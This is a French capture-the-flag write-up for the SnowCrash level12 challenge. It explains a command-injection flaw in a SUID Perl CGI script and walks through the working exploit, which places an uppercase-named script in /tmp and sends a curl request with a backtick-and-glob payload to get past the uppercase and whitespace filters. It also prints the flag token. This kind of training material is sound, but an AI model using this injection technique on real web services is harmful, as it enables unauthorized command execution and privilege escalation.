# LEVEL12

Voici comment se présente le système de fichier:

``` bash
level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

Le fichier `level12.pl` a le bit SUID activé, on va pouvoir donc utiliser les privilèges de flag12.

``` bash
level12@SnowCrash:~$ getfacl level12.pl
# file: level12.pl
# owner: flag12
# group: level12
# flags: ss-
user::rwx
group::r-x
group:flag12:rwx		#effective:r-x
mask::r-x
other::r-x
```

Le script perl utilise le module CGI, il traite les requetes HTTP faite à un serveur.


``` perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;                       
  $xx =~ s/\s.*//;                          
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));

```

Ce script expose un paramètre `x` via une interface CGI. ce paramètre est directement injecté dans une commande système exécutée via des backticks: ```@output = `egrep "^$xx" /tmp/xd 2>&1`;```
L'absence de sanitisation (nettoyage) de la variable `$xx` permet une injection de commande.

La variable `$xx` est modifiée par deux obstacles pour l'injection de commande :
- `tr/a-z/A-Z/` : `tr` convertit les minuscules en majuscules, il permet une opération de translittération. Ainsi elle neutralise toute commande système classique (ex: `ls` devient `LS`)
- `s/\s.*//` : effectue une troncation au premier espace. `s/` (en référence à la commande `sed`) remplace les whitespaces(`\s`), tous les caractères (`.`) qui suivent un nombre indéfini de fois (`*`) par rien (`//`). Elle empeche l'utilisation d'arguments ou de redirection dans l'injection (ex: `getflag > /tmp/file` devient `getflag`).

La commande entourée de backticks va ensuite permettre d'exécuter le payload en invoquant un sous shell : ```@output = `egrep "^$xx" /tmp/xd 2>&1`;```

Nous allons donc créer un script bash dans un fichier pour exécuter notre commande `getflag`. 

```bash
level12@SnowCrash:~$ vim /tmp/SCRIPT
level12@SnowCrash:~$ cat /tmp/SCRIPT
#!/bin/bash
getflag > /tmp/result
```

On va nommer notre fichier avec des majuscules pour survivre à la translittération de `$xx`

Nous donnons toutes les permissions à l'utilisateur avec `chmod`:
``` bash
level12@SnowCrash:~$ chmod +x /tmp/SCRIPT
level12@SnowCrash:~$ ls -la /tmp/SCRIPT
-rwxrwxr-x 1 level12 level12 35 Mar 30 14:02 /tmp/SCRIPT
```

Puis nous lancons la commande avec une expansion de chemin (Shell Globbing) `/*/` pour désigner le chemin et éviter d'inscrire des minuscules dans l'argument. Le Shell globing permet au Shell de remplacer une étoile par un chemin réel.
Comme le chemin contient une étoile et des majuscules, il survit à la translittération tr/a-z/A-Z/ tout en désignant un fichier contenant des minuscules.

On utilise aussi les simple quotes pour éviter l'interprètation par le shell actuel. 
Nous ajoutons les backticks pour éviter que "/*/SCRIPT" soit interpréter comme une chaine de caractère. 


``` bash
level12@SnowCrash:~$ curl 'http://localhost:4646?x=`/*/SCRIPT`'
..level12@SnowCrash:~$cat /tmp/result
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

L'argument transmis au script perl se présentera alors de cette manière dans le code:
``` perl
@output = `egrep "`/*/SCRIPT`" /tmp/xd 2>&1`;
```
